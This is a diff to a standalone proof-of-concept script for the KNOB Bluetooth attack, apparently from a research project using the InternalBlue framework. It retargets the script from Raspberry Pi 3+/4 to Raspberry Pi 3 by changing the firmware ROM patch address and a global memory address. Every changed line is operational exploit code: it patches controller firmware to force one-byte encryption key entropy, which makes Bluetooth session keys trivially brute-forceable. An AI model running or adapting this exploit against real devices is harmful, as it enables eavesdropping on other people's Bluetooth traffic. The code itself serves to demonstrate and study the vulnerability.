@@ -9,7 +9,7 @@ from internalblue.hcicore import HCICore
 
 
 """
-This is a standalone PoC for the KNOB attack on a Raspberry Pi 3+/4.
+This is a standalone PoC for the KNOB attack on a Raspberry Pi 3.
 
 Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
 For details see https://github.com/francozappa/knob
@@ -31,11 +31,11 @@ if not internalblue.connect():
 log.info("Installing patch which ensures that send_LMP_encryptoin_key_size_req is always len=1!")
 
 # modify function lm_SendLmpEncryptKeySizeReq
-patch = asm("mov r2, #0x1", vma=0x3B3D4)  # connection struct key entropy
-internalblue.patchRom(0x3B3D4, patch)
+patch = asm("mov r2, #0x1", vma=0x689F0)  # connection struct key entropy
+internalblue.patchRom(0x689F0, patch)
 
 # modify global variable for own setting
-internalblue.writeMem(0x204A5F, '\x01')  # global key entropy
+internalblue.writeMem(0x204127, '\x01')  # global key entropy
 
 
 internalblue.shutdown()
